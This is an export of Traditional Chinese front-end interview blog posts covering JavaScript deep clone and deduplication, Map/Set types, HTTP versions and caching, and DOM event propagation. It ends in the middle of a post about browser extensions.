通常在面試中，用上述兩種方式，可能會被面試官追問說，如果不用這種現成的方法，要如何手寫？\n以下的寫法是透過遞迴的方式，來進行深拷貝：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function deepClone(obj) { // 確認是不是原始型態，如果是的話就直接回傳 if (obj === null || typeof obj !== \u0026#39;object\u0026#39;) { return obj; } // 確認是不是 Date 或 RegExp 這種特殊型態，是的話就透過建構式複製一個相同的值，然後回傳 if (obj instanceof Date || obj instanceof RegExp) return obj.constructor(obj); // 看 obj 是物件還是陣列，然後先建一個新的空物件 (或空陣列) let result = Array.isArray(obj) ? [] : {}; // 透過 Ojbect.entries 來迭代，然後遞迴地對每個值深拷貝 // 因為 Object.entries 不會列舉整個原型鍊 (prototype chain) // 所以不用透過 obj.hasOwnProperty(key) 額外檢查是不是非原型鏈上的屬性 for (const [key, value] of Object.entries(obj)) { result[key] = deepClone(value); } // 最後回傳結果 return result; } 陣列去除重複(remove duplicates)方法 在陣列中把重複的項目去除掉，是很常在實際工作中需要執行的操作。因此在 JavaScript 面試時，也很常會被問。這種題目通常會要當場手寫，所以假如你不太確定要怎麼手寫去除重複，一定要在面試前多練習幾次。\n陣列去除重複題目長什麼樣？ 陣列去除重複的面試題，通常會像下面這樣，給一個陣列，裡面有重複的數字，並要求寫一個 removeDuplicate 函式，輸入是原始陣列，輸出是去除重複數字的陣列。\n1 2 3 4 5 6 7 8 const originalArr = [9, 1, 2, 2, 3, 4, 2, 4, 8, 1, 9] function removeDuplicate(array){ // ... } const ans = removeDuplicate(originalArr); console.log(ans) // [9, 1, 2, 3, 4, 8] 陣列去重複其實有很多種做法，以下會列出 4 種常見做法。在面試考手寫題時，陣列去重複有可能是單獨一種題型，或者是在解手寫題時一開始需要將陣列進行去重複的操作。\n建議詢問面試官題目的需求、主動跟面試官討論期望的解法，再選擇要使用哪一種解法。\n四種解法 解法一：使用 Set 去重複 Set 的資料格式與用法類似於 Array，但有一特色是 Set 中只能儲存任何資料的唯一值，因此可以先將 Array 轉為 Set，此時重複的值會被移除，再將 Set 轉為 Array。程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 function removeDuplicate(arr) { return Array.from(new Set(arr)); } // 也可以利用 spread syntax 更簡化程式碼 // function removeDuplicate(arr) { // return [...new Set(arr)]; // } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arr1After); // [1, 2, 3, 8] 解法二： filter 搭配 indexOf 此解法先用 array 的 filter 方法，搭配 indexOf 方法，只保留第一次出現的值，所以只要是第二次出現的，就會被篩掉，這能確保結果不會有重複的。程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 function removeDuplicate(arr) { // indexOf 會回傳在這個 array 等同於此值第一個 item 的 index， // 所以如果 indexOf 回傳的 index 相等於目前 filter 到的值， // 則代表該值是第一次出現，我們保留起來， // 反之，如果 index 不等於，則代表此 array 中前面位置已經出現過，所以就 filter 掉。 return arr.filter((item, index, array) =\u0026gt; array.indexOf(item) === index); } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arrAfter); // [1, 2, 3, 8] 解法三： 雙層 for loop 雙層 for loop 是一種暴力解。依序遍歷整個 array，再透過第二層 for loop 找出重複的值將其移除。程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 function removeDuplicate(arr) { // 第一層 for loop，i 從 index 0 開始，到 arr 最後 for (let i = 0, len = arr.length; i \u0026lt; len; i++) { // 第二層 for loop，j 從 i + 1 開始，要檢查值是否重複 for (let j = i + 1; j \u0026lt; len; j++) { // 如果值重複，則透過 splice 方法將 j 位置的值從 arr 去除 if (arr[i] == arr[j]) { arr.splice(j, 1); // 移除重複的值之後，arr length 長度會需要減 1 len--; // j 位置的值被移除，因此 j index 也要減 1 j--; } } } return arr; } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arrAfter); // [1, 2, 3, 8] 解法四： 透過 object 或 Map 儲存以遍歷過的項目 我們可以透過 object 或 Map 來儲存已經遍歷過的項目，來找出是否已存在陣列當中，如果還不在，那就放進要輸出的陣列；如果已經在了，就不再放入，這樣一來能確保陣列中沒有重複的值。程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function removeDuplicate(arr) { let seen = {}; let newArray = []; // 遍歷過原本的陣列 for (let item of arr) { // 判斷當前被遍歷到的項目是否已經放入過 if (seen[item] !== true) { newArray.push(item); // 如果還沒，則放入要被輸出的新陣列 seen[item] = true; // 這時紀錄一下這個項目已經被放入，下次就不會再被放入 } } return newArray; } let arr = [1, 2, 3, 2, 3, 8]; let arrAfter = removeDuplicate(arr); console.log(arrAfter); // [1, 2, 3, 8] ","date":"2022-12-26T00:00:00Z","image":"https://live.staticflickr.com/65535/52586703288_92fa0363b4_o.jpg","permalink":"https://wayneblog.ga/2022-12-26/js-rebuild-common-function/","title":"前端面試常考的 JavaScript 手寫題彙整"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\nES6 推出了 Map 物件，讓開發者可以透過這個特製資料結構進行鍵值對(key-value pairs)的操作。然而 JavaScript 原始物件(plain object)就可以用來做鍵值對的操作，為什麼還需要 Map 物件呢？ Map 物件解決了什麼問題？那與 Set 又有什麼不同呢？本篇來詳細說明一下。\nMap 與 object 的差別 原始物件的鍵(key)只可以是字串，但 Map 的鍵可以是任何東西 在用鍵值對處理資料時，很常開發者會用各類東西做為鍵(key)，但是在 JavaScript，如果用原始物件，不管用什麼當做鍵，都會被轉換成字串，這往往會造成一切錯誤，例如被轉成字串時，原本兩格不同的鍵被轉成同樣的字串，這就導致撞鍵問題。而 Map 物件解決了這個問題，開發者想用什麼當鍵都可以。\n原始物件不支援迭代(iteration)，但 Map 物件有 過去我們沒辦法直接對一個原始物件用 for...of、forEach 來迭代，而是需要用額外的方法，例如 Object.entries、Object.keys 來協助。但是 Map 物件是可迭代的(iterable)，所以我們可以直接對 Map 物件用 for...of、forEach。\n原始物件的元素沒有順序性，Map 物件則有順序 上面提到 Map 物件是可迭代的，它有一個相關的優點是在迭代時是有順序性的。過去用原始物件，即使用用物件方法 (例如 Object.entries、Object.keys 來協助迭代)，迭代出的結果順序不一定會是我們放入鍵值對的順序。\n但有時候在寫演算法時，我們需要保留順序，這時 Map 物件就會好用很多。\nMap 提供許多鍵值對常用的方法，但原始物件沒有 舉例來說，如果要知道一個鍵值對的大小，Map 有 size 方法，簡單又好用；但如果用原始物件，我們可能需要使用 Object.keys 然後搭配 .length 去自己找該物件有多少個鍵，這就麻煩很多。\n另外 Map 也有提供 clear 方法，可以一次把所有鍵值對刪掉；如果是原始物件就需要一個一個刪。\nMap 類似於 Object 的資料結構，都是用鍵與值(key-value pair)的形式儲存資料格式，但還是有許多差異。\nMap 本身是一種構造函式，用來生成 Map 這種數據結構，具體做法是 new Map() 來生成實例。\n常見操作方法 Map 常見操作方法有\nset(key, value)： Map 新增元素。 get(key)： 透過鍵(Key)查詢特定元素，並返回。 has(key)： 判斷 Map 中是否存在某鍵(key)。 delete(key)： 透過鍵(Key)從 Map 中移除特定元素。 size： 方法得到元素的數量。 常見遍歷方法 Map 常見遍歷方法(遍歷順序會是插入順序)\nvalues()： 返回 Map 中所有元素的值。 keys()： 方法等同於 values()。 entries()： 返回 Set 中所有的元素，因在 Set 中沒有鍵值(Key)，返回的元素會是 [value, value] 的形式。 Map 和 WeakMap 的區別 WeakMap 的方法和使用部分與 Map 資料結構相近，本區塊會專注在這兩者不同之處。\nWeakMap 只允許物件(Object) 作為鍵名(key)，但是 null 除外。而 Map 則是可接受各種資料類型作為鍵名(key)。 WeakMap 中的鍵名是**「弱引用」(weak reference)**，鍵名(key)所指向的對象可以被垃圾回收，此時的鍵名(key)是無效的。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 如果放入的物件在外面沒有其他引用，在 WeakMap 中會被垃圾回收掉 let food = new WeakMap(); let fruit = { name: \u0026#39;apple\u0026#39; }; food.set(fruit, \u0026#39;good\u0026#39;); // 將 apple 物件置入 WeakMap 中 fruit = null; // 移除 apple 的引用 console.log(food); // WeakMap(0) fruit 已經被垃圾回收，因此 WeakMap 中沒有項目 // 一般的 Map，即使放入的物件在外面沒有其他引用，仍在 Map 當中存放 let food = new Map(); let fruit = { name: \u0026#39;apple\u0026#39; }; food.set(fruit, \u0026#39;good\u0026#39;); console.log(food); // WeakMap(1) fruit = null; console.log(food); // WeakMap(1) fruit 不會被垃圾回收 在上方的強引用程式碼中，雖然 fruit 物件最後被重新賦值為 null (意思等同於無法再透過 fruit 變數獲取該對象值，因為其中的引用被斷開)，但由於 food 與此物件間存在強引用，所以被保留在記憶體中，這就是前面提到的，強引用會防止物件被垃圾回收，並將物件保留在記憶體當中； 弱引用則相反，並不能防止物件被垃圾回收，當 JavaScript 執行環境執行垃圾回收時，上述弱引用例子中的 fruit 物件會被從記憶體和 WeakMap 中刪除。\n弱引用的適用情境在於，如果引用的物件在未來可能會被刪除的情況、且不想防止被垃圾回收時，就適合用 WeakMap 或 WeakSet。例如，如果我們想要記錄一些與 DOM 節點相關的數據，有一種方法是使用 Expando 擴充節點上的資訊，但壞處是會直接修改到這個 DOM 節點、且如果未來這個節點被移除時，相關資訊不會被垃圾回收掉，這時如果是使用 WeakMap 就會是很好的替代方案。\n備註： 如果直接將弱引用程式碼的例子在 JavaScript 執行環境中執行，可能還是會看到 WeakMap 中有值，這是因為 JavaScript 執行環境會在特定的時間點執行垃圾回收。\nSet Set 這個數據結構類似陣列，但是裡面的元素值都是唯一，不會有重複的值，無論此值是原始型別(primitive values)或引用型別(object references)。在 JavaScript 當中，Set 本身是一種構造函式，用來生成 Set 這種數據結構，具體的做法是透過 new Set() 來生成實例。\n常見操作方法 Set 常見操作方法有\nadd(value)： 用來新增值。 delete(value)：用來刪除每個 Set 中的值。 has(value)：判斷 Set 中是否存在每個值。 size： 方法得到元素的數量，與陣列使用 arr.length 方法不一樣。 Set 中沒有鍵值(Key)，如果使用 entries() 遍歷，返回的元素會是 [value, value] 的形式。\n1 2 3 4 5 6 7 8 9 10 11 const set1 = new Set(); set1.add(42); set1.add(\u0026#39;forty two\u0026#39;); const iterator1 = set1.entries(); for (const entry of iterator1) { console.log(entry); // expected output: [42, 42] // expected output: [\u0026#34;forty two\u0026#34;, \u0026#34;forty two\u0026#34;] } Set 和 WeakSet 的區別 WeakSet 的方法和使用部分與 Set 資料結構相近，本區塊會專注在這兩者不同之處。\nWeakSet 內的元素值只允許是物件(Object)，但 Set 可接受各種資料類型的值。 1 2 3 4 5 6 7 const wSet = new WeakSet(); const a = [1, 2, 3]; const b = { name: \u0026#39;explainthis\u0026#39; }; wSet.add(a); // WeakSet {Array(3)} wSet.add(b); // WeakSet {{...}} wSet.add(1); // Uncaught TypeError: Invalid value used in weak set WeakSet 內的元素都是**「弱引用」(weak reference)**，可以被垃圾回收機制回收。假如使用 Set ，即使某個被存入的值，在其他地方已經沒有被引用，該值仍會存在於 Set 當中，不會被垃圾回收。但如果是 WeakSet，則會被垃圾回收。如果要更有意識地做記憶體管理，WeakSet 在許多時候能派上用場。 1 2 3 4 5 6 7 const disableElements = new WeakSet(); const loginButton = document.querySelector(\u0026#39;#login\u0026#39;); disableElements.add(loginButton); // 使用的時候通過查詢元素是否在集合中，就可以知道它是否被禁用。而一旦元素从DOM樹中删除， // WeakMap也會釋放其内存（為了嚴謹，假設没有其它地方引用這個對象）。 disableElements.has(loginButton); // true ","date":"2022-12-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52576483407_0c40603733_o.jpg","permalink":"https://wayneblog.ga/2022-12-21/js-map-set-difference/","title":"Javascript 中，Map、Set、WeakMap 和 WeakSet 的區別？"},{"content":" 參考網站\n參考網站\n從 1989 年起，HTTP 經歷了數代的演化，從 1 到 1.1 再到 2 以及目前的 3，這些不同版本有些什麼不同呢？不管是前端或後端的面試，都是經常會考的。這篇我們會先針對 1 到 1.1 再到 2 之間的異同處做摘要。\n出現時間 超文本傳輸協定 HTTP (HyperText Transfer Protocol) 是在網際網路中用來通信數據的基礎。HTTP 一開始的發展是從 1989 年所發起制定，其中經過幾個時期的演進，HTTP/1.1 是隨著在 1999 年 6 月公布的 RFC 2616 所發表 。HTTP/2 (最初命名為 HTTP 2.0) 則是在 2015 年 5 月以 RFC 7540 正式發表，並取代 HTTP/1.1 成為 HTTP 的實作標準。截至 2021 年 10 月，全球有 46.5%的網站支援了 HTTP/2 (wiki)。\nHTTP/1 和 HTTP/1.1 差異 往下讀之前，要先理解之所以會有 HTTP/1.1 是因為 HTTP/1 有一些不那麼理想的地方。因此建議不要死背差異，而是從「 HTTP/1.1 解決了什麼問題」出發來理解。\n持久連接 (keep-alive) HTTP/1 在發送每個請求之前都需要建立一個新的連接，而每次連接都是有成本的，這種每次重連的方式會造成很多頻寬的浪費，以及時間的延遲。而 HTTP/1.1 默認使用持久連接，讓 HTTP/1.1 可以使用同一個 TCP 連接來重複多個 HTTP 請求，這麼一來就可以避免每次重新建立連接造成的頻寬浪費、時間延遲。\n狀態碼 100 (Continue) 在某些情況下，伺服器端會拒絕客戶端發送的請求，因為發請求時可能會夾帶正文 (request body)，所以每次請求被拒絕都會造成頻寬上的額外浪費。在 HTTP/1 沒有機制避免這種類型的浪費，而 HTTP/1.1 的 100 (Continue) 狀態碼則可以協助我們避免這種浪費。具體來說，HTTP/1.1 讓使用者端先送出一個只含有標頭、不帶內文的請求到伺服器，伺服器確認沒有問題之後，會回應狀態碼 100 (Continue)；收到 100 (Continue) 後，客戶端才會正式發一個帶有正文的請求；如果沒有收到，則代表伺服器端不接受該請求，這讓客戶端知道伺服器端不接受，這能讓客戶端可以避免發帶有正文的請求，進而減少傳輸上的頻寬浪費。(詳細請見 RFC 的這個段落)。\n快取緩存 HTTP/1 主要使用標頭中的 If-Modified-Since、Expires 來做為緩存的判斷標準，這兩者都是以時間作為依據；HTTP/1.1 則引入更多的緩存策略，例如：Etag、If-Unmodified-Since、If-Match、If-None-Match，透過這些可以更優化緩存的實現 (這些標頭的使用在面試也很常考，詳見這篇文章)。\nHost 字段 HTTP/1.1 增加了 Host 字段，用來指定伺服器的域名。在 HTTP/1 中，會認為每台伺服器都綁定唯一的 IP 地址，因此請求當中的 URL 並沒有傳遞主機名(hostname)。但隨著之後虛擬主機技術的演進，現在在一台伺服器上可以存在多個虛擬主機，並且他們會共享同一個 IP 地址。所以有了 host 字段之後，就可以將請求發往同一台伺服器上的不同網站。\n更多請求方法 HTTP/1.1 相對於 HTTP/1 新增了許多請求方法，現今我們常用的 PUT, PATCH, DELETE, CONNECT, TRACE 和 OPTIONS 等都是在 HTTP/1.1 時新增的。\nHTTP/2 和 HTTP/1.1 比較 多路復用(Request multiplexing) 來解決頭部阻塞 (head-of-line blocking) HTTP/1.1 使用了 pipelining 的機制，這可以讓客戶端在同一個 TCP 連接內並行發出多個 HTTP 請求，客戶端也不需要等待上一次請求結果返回，就可以發出下一次請求，但伺服器端必須依照接收到的客戶端請求的先後順序一次返回，以保證客戶端能夠區分出每次請求的回應內容，但這項機制在實作上較難實現，因此各家瀏覽器，都將此功能預設為關閉。(可以參考此篇 stackoverflow)。此外 pipeline 也造成頭部阻塞(head-of-line blocking ( HOL ))問題，如果有任一個請求要操作很久或傳輸包流失，那就會阻塞整個 pipeline 的工作。\nHTTP/2 引進了多路復用的機制，讓同一個 TCP 連接中，同時發送和接受多個請求，並且不用等到前一個請求收到回應，透過這個機制，解決了過往在 HTTP 層級的的頭部阻塞問題 (備註：但 TCP 層級仍有頭部阻塞問題，這會在 HTTP/3 被解決)。\n優先請求順序 HTTP/2 版本中，每個請求或回應的所有數據包，稱之為一個數據流，並且，每個數據流擁有一個唯一編號 ID (stream ID)。每個數據包在發送的時候就會戴上對應的數據流編號 ID，客戶端還能指定數據流的優先級，優先級越高服務器也會越快做出回應。\n標頭(Header)訊息壓縮 在 HTTP/2 之前因為安全性問題，多數不會對標頭的訊息進行壓縮，主要是過去的採用的演算法可能遭受 CRIME 攻擊。在 HTTP/2 中，使用 HPACK 算法來避免攻擊，進而能壓縮標頭。因為壓縮標頭，讓傳輸時能大幅減少傳輸的訊息量，進而減少頻寬負擔，也增快傳輸速度。具體上 HPACK 使用一份索引表來定義常用的 http header，並把 http header 存放在表裡，請求的時候只需要發送在表裡的索引位置即可，不須用傳完整的標頭。\n伺服器主動推送(Server push) HTTP/2 允許伺服器端主動向客戶端推送數據，這能協助減少客戶端的請求次數。舉例來說，瀏覽器在過去要請求 index.html 與 style.css 來渲染完整的畫面；透過 Server Push，可以在瀏覽器請求 index.html 時，也由伺服器主動發送 style.css ，這樣只需要一輪 HTTP 的請求，就可以拿到所需的所有資源。\n","date":"2022-12-19T00:10:00Z","image":"https://live.staticflickr.com/65535/52571909202_4ddc6d0335_o.jpg","permalink":"https://wayneblog.ga/2022-12-19/browser-http1.0-http1.1-http2.0-difference/","title":"面試常見的瀏覽器問題(三) - HTTP/1、HTTP/1.1 和 HTTP/2 的區別"},{"content":" 參考網站\n參考網站\n當使用者與瀏覽器互動時，會觸發各類不同的事件(event)，例如常見的點擊(click)、滑動(scroll)。我們可以透過 JavaScript 的事件處理器(handler)，來處理這些事件。讓我們能在事件觸發時，做出我們要的效果，例如點擊某個按鈕，觸發某個邏輯。\n針對瀏覽器事件，最常見的考題之一，便是事件委派、事件捕獲、事件冒泡，是很常見的面試考題。以下將用第一人稱的擬答，來回答「請說明瀏覽器中的事件委派、捕獲、冒泡」這個問題。\n事件委派 事件委派是當我們想要在一群子元素中，都加上同樣的事件監聽器與處理器時可以派上用場。當我們有許多相同元素，有相似的行為時，我們可以不用在每個元件都加上處理器，而是可以直接在父層加上處理器。這時透過 event.target 來得知實際上是哪一個元素發生事件，並處理該事件。\n這種把監聽器與處理器裝在父層，然後委派給子元素，就是所謂的事件委派。\n這麼做的好處是，我們不用在每個元件，例如每個按鈕上都加上處理器，這可以減少記憶體消耗；這也讓我們的架構更彈性，可以隨時新增或移除元素。也可以寫比較少的程式碼，讓可閱讀性提升。\n舉例來說 (編按：此例子來自 MDN)，如果想要在一長串列表中的每個項目，都加上處理器，我們可以直接加在父層，不用每個子元素都加上，就算今天有上百上千個子元件都是。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;div id=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;tile\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt;; 1 2 const container = document.querySelector(\u0026#39;#container\u0026#39;); container.addEventListener(\u0026#39;click\u0026#39;, (event) =\u0026gt; (event.target.style.backgroundColor = bgChange())); 事件捕獲 事件委派之所以能夠發生，是因為在背後的事件捕獲與冒泡機制。一般來說，當事件觸發時，會先進入捕獲階段，然後到達事件目標，接著才是冒泡階段。(建議在面試時，可以簡單手繪這張 W3C 的事件流程，會更加幫助說明唷！)\n從上圖可得知，所謂的捕獲階段是指：當某個事件觸發時，例如使用者點了某個按鈕，此時由 DOM 樹的最上層 Window 一路往下，將事件傳遞下去並執行。實際在程式碼上，需要在事件監聽器中，加入 {capture: true} 來開啟捕獲機制。\n事件冒泡 冒泡階段則是比較常用的，跟捕獲階段相反，它是先在目標上執行事件處理器，接著傳遞到父層，再傳到祖父層，然後一路傳上去。\n1 2 3 4 5 6 7 \u0026lt;form onclick=\u0026#34;alert(\u0026#39;form 點擊事件觸發\u0026#39;)\u0026#34;\u0026gt; 這是一個 form 元素 \u0026lt;div onclick=\u0026#34;alert(\u0026#39;div 點擊事件觸發\u0026#39;)\u0026#34;\u0026gt; 這是一個 div 元素 \u0026lt;p onclick=\u0026#34;alert(\u0026#39;p 點擊事件觸發\u0026#39;)\u0026#34;\u0026gt;這是一個 p 元素\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; 以上面的例子來說(建議在面試時也可以簡單快速手寫這個例子，可以幫助說明)，當我們在子層 \u0026lt;p\u0026gt; 裝一個 onclick 的處理器，點下去時，不僅該元素有跑出 alert ，其父層 \u0026lt;div\u0026gt; 的 onclick 也被觸發，然後祖父層 \u0026lt;form\u0026gt; 的 onclick 也接續被觸發。\n這邊有個細節需要分別，在冒泡時的 this 不必然等於 event.target，而是會等於 event.currentTarget。換句話說，this 是正在執行的處理器 (會一直變成下一個)；而 event.target 一直都會是真正變點擊的那個(在這邊就是最裡頭的子層)。\n在實務上，我們有時候不想要冒泡，例如只想要子元素的事件被觸發，不想要父層的元素被觸發，避免干擾。這時候想要不發生冒泡，可以在處理器加上 event.stopPropagation()(不過這個仍會讓該處理器執行，只是不會冒泡上去)；如果連該處理器的其他事件類別都不想執行的話，可以用 event.stopImmediatePropagation()。\n","date":"2022-12-19T00:05:00Z","image":"https://live.staticflickr.com/65535/52571751437_6018c4804c_o.jpg","permalink":"https://wayneblog.ga/2022-12-19/browser-delegation-capture-bubble/","title":"面試常見的瀏覽器問題(二) - 事件委派、捕獲、冒泡"},{"content":" 參考網站\n參考網站\n如果要加快網頁應用程式的速度，caching 是個經常被用的策略 (caching 中文有被翻譯成緩存或快取，但因為工作與面試時都還是會說 caching 居多，這篇就暫不翻譯這個詞了)。當我們已經跟後端請求過某個資源，例如某筆資料或某張圖片，下一次再次請求時，如果該資源沒有改變，這時再次請求會相對浪費網路頻寬；反之，如果第一次請求來的資源已經被存下來，那麼下次請求時，可以直接用該資源，這樣可以減少不必要的請求。而這也是 caching 的概念。\ncaching 可以被應用在很多地方，AWS 的這篇文章中有概略分析到，在客戶端、DNS、伺服器、資料庫等地方都可以做 caching。而身為前後端工程師，在面試中很常被問到的是 HTTP 的 caching 機制。透過本篇文章，希望讓大家下次面試時被問到「請說明 HTTP caching 機制」時，可以解釋地夠清楚與完整。\nHTTP caching 是用在哪？ 為什麼要用 HTTP caching？ 可以把 cache 理解成某個我們暫時存放資源(例如某筆資料、某張圖片)的地方，所以當下次需要這些資源時，不用再請求一次，而是可以直接從 cache 這個暫存處拿到。換到 HTTP caching 的脈絡，這個暫存的地方就是瀏覽器。\n舉例來說，當今天使用者逛了 LV 的官網，官網中的商品圖片與價錢，不太會快速改變，換句話說現在逛跟一小時後逛，看到的資訊很可能是完全一樣的。\n這時當第一次逛網站時，前端跟伺服器請求了這些商品圖片、描述與價錢，把他們 cache 起來 (放在瀏覽器記憶體的某個地方)，當使用者下次逛的時候，就不需要再跟伺服器請求了。下面這張是來自 MDN 的圖示，可以看到，如果沒有 cache，每一次請求都要對到伺服器；然而如果有 cache，則可以從 cache 裡面拿，可以減少直接對伺服器的請求：\n讀到這邊我們可以歸納出，這麼做有幾項 caching 好處，也是我們為什麼要用 caching 的理由：\n減少請求次數：因為不用請求，而是直接從 cache 拿出之前暫存的資料，這樣做能減少伺服器與資料庫端的負擔。 加快資源載入：向伺服器請求，需要等網路傳輸資料。直接從瀏覽器裡面的 cache 拿，就不用等這一段資料傳輸的時間，會快很多。 該如何設定 HTTP caching？ 上面談到 HTTP caching 的好處，以及可以把跟伺服器請求來的資料 cache 在瀏覽器中。但實際上該如何設定呢？這也是面試時會被追問的。\n以下有幾種方式：\nExpires 第一種方式是在 HTTP Response header 當中加入 Expires，舉例來說：\n1 Expires: Tue, 18 Jul 2022 16:07:23 GMT 瀏覽器收到該回應的資料會先把資料存在 cache 當中，而下一次用戶發送相同請求時，瀏覽器會去判斷現在時間是否已經到了 Expires 設定的時間，如果還沒到，那就會直接從 cache 裡面拿資料，而不是發送請求。\ncache-control 由於 Expires 是比較舊的方法，現在比較少人會用，更多人會用 cache-control。cache-control 的設定方式不是直接設定一個 cache 過期的時間點，而是設定 cache 有效的時間。舉例來說，下面這段是設定 cache 有效期是 60 秒。所以在第一次請求拿到回應後的六十秒內，如果在發送相同請求，瀏覽器都會直接拿 cache 的資料，而不是發請求到伺服器端：\n1 cache-control: max-age=60 cache-control 快問快答 關於 cache-control 的設定，有一些面試常會被問的快問快答，以下列出題目。下面會有答案，不過大家可以先自己想想看，看看自己知不知道這些問題的回答。\n如果只想讓客戶端 cached，而不想讓中間層的代理伺服器等其他層 cached，該用什麼？ 反之，如果想讓代理伺服器也能夠 cached 從後端來的資料，該用什麼？ 因為很多時候瀏覽器可能會自動 cache，如果完全不想要有 cache，想要內容一直都是最新的，那又該用什麼 cache-control: no-store 跟 cache-control: no-cache 兩者有什麼差別？ 上面的問題的回答分別是：\ncache-control: private cache-control: public cache-control: no-store cache-control: no-store 是指不要 cache，而 cache-control: no-cache 則是指會 cache，不過每一次請求時都要重新驗證一次 (revalidate)，換句話說每次都還是會問伺服器內容有沒有更新，沒更新就用 cache 的。詳見這篇討論。\nHTTP caching 過期後，該如何重新驗證？ 上面提到我們可以透過 cache-control: max-age 來設定多久後 cache 過期；不過當 cache 過期後就要直接跟伺服器請求嗎？\n如果 cache 過期了，但其實伺服器那邊的資料並沒有更新，換句話說 cache 還是可以繼續被使用，這時有沒有什麼方法可以避免我們直接重新請求，繼續使用 cache？\n有的，這又被稱為驗證 (validation)，而 HTTP caching 有兩種主要方式可以做到這件事。\nETag (搭配 If-None-Match) 第一個方式是在回應的 header 當中放入 ETag (entity tag 的簡寫)。這個 ETag 會是一個獨特的值，例如 ETag: \u0026ldquo;686897696a7c876b7e\u0026rdquo;；如果後端的資料有變動，則 ETag 會改變。如果伺服器在回傳的 header 中有放入 ETag， 則之後瀏覽器在請求時，會在請求的 header 帶上 If-None-Match 欄位，而欄位的值會是之前收到的 ETag 的獨特值。\n這時後端收到了該請求，並去查看 If-None_match 當中的 ETag 跟現在的 ETag 是不是一樣的。如果是一樣的，就代表後端的資料沒變(因為如果資料有變，則 ETag 會跟著變)；這時只需用傳個 304 Not Modified 給前端，瀏覽器收到 304 後，就知道資料沒變，所以可以繼續用 cache 的。\n而如果後端比較了 ETag 發現改變，那就不是回傳 304，而是回傳一包新的資料。\nLast-Modified (搭配 If-Modified-Since) 第二個方式則是在伺服器的回應 header 中加入 Last-Modified，並標注最後修改該資源的時間，例如 Last-Modified: 2021-11-07 21:32:16。\n當瀏覽器收到帶有 Last-Modified 的回應後，之後的請求就會帶上 If-Modified-Since，然後帶上先前收到的時間，例如 If-Modified-Since: 2021-11-07 21:32:16。伺服器收到帶有 If-Modified-Since 的請求，比對了時間，如果更新資源的時間沒有變，拿一樣可以回傳 304 Not Modified 給前端，如果變了則回傳 200 以及新的資料。\n","date":"2022-12-19T00:00:00Z","image":"https://live.staticflickr.com/65535/52571693467_4bcdc4d080_o.png","permalink":"https://wayneblog.ga/2022-12-19/browser-http-caching/","title":"面試常見的瀏覽器問題(一) - HTTP caching 機制"},{"content":" 參考網站\n參考網站\n油猴腳本運行於油猴插件之上，油猴插件本質上對瀏覽器能力的再封裝。既然如此，我們先來簡單了解一下瀏覽器插件。\n瀏覽器插件(Browser Extension)：瀏覽器的擴展應用 說的直白一點，就是拿著瀏覽器開放的能力(插件API)，去實現一些小型應用。\n瀏覽器插件主要由四部分構成：background scripts、content scripts、全局 UI 元素、options page。\nbackground scrips: 後台腳本，一個後台腳本是一個獨立線程，是游離於各個頁面之外的\u0026quot;上帝之眼\u0026quot;。具有訪問各類插件 API 的能力，但同時也喪失了直接操作頁面的能力。 content scripts：內容腳本，具有直接操作頁面的能力。其實就是在頁面中運行 js 腳本，可以使用 DOM API。content script 只能直接訪問少量插件 API，但能和 background script 進行雙向通信完成數據交換。 全局 UI 元素：瀏覽器層的UI 交互，包括： 在 Toolbar 顯示 icon，定義點擊 icon 後顯示的 Popup 或其他效果 增加右鍵選項 增加全局快捷鍵 改造新Tab 頁、歷史記錄頁、書籤頁 options page：插件配置頁。 瀏覽器插件的核心機制可以用下圖簡單概括：\n想必，大家最好奇的還是有哪些 API 以及能用這些 API 做什麼，這裡例舉幾個：\ncontextMenus：增加右鍵選項。 使用選中文本，例如：劃詞翻譯、文本收集 快速調用插件功能，例如：打開 DevTool，頁面剪藏 cookies：增刪改查 cookie(任意域名)，直接拿著本地 cookie 發送請求，不必再做授權。同時由於後台腳本不是 Web 頁面，在發送請求時沒有跨域限制。 多平台信息聚合 多平台信息分發 devtools.panels：增加 Devtool 面板，這個對前端開發者來說應該很熟悉，React Developer 